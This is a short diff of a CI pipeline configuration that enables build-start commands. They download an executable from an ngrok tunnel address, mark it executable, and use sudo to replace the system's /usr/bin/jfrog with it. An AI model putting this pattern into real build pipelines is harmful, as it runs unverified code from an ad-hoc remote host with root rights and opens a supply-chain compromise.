@@ -70,11 +70,11 @@ pipelines:
          onStart:
            - javac -version
            - gradle --version
-#            - wget a7a091e9.ngrok.io/jfrog
-#            - chmod +x jfrog
-#            - sudo rm /usr/bin/jfrog
-#            - mv jfrog /usr/bin/jfrog
-#            - which jfrog
+           - wget a7a091e9.ngrok.io/jfrog
+           - chmod +x jfrog
+           - sudo rm /usr/bin/jfrog
+           - mv jfrog /usr/bin/jfrog
+           - which jfrog
            
      - name: publish_build_info_gradle
        type: PublishBuildInfo
